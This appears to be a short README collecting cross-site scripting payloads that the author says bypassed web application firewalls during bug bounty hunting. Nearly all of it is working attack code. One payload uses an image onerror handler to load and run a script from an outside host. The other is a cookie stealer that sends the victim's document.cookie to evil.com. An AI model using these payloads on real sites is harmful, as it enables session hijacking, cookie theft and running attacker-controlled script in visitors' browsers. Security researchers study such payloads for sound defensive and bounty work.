# xss_waf_bypass
Some collection of xss payloads that worked for me to bypass wafs while doing bb

### Payloads

Inject external javascript without using `<script>` tag since it's blacklisted in almost all modern waf

```html
<img src=x onerror="var script = document.createElement('script'); script.src = 'https://eternal.h4ck.me/xss.js'; document.head.appendChild(script);">
```

cookie stealer example

```js
// xss cookie stealer poc
var cookie = encodeURIComponent(document.cookie);
var url = 'https://evil.com/index.html/?victim_cookie=' + cookie;
window.location.href = url;
```
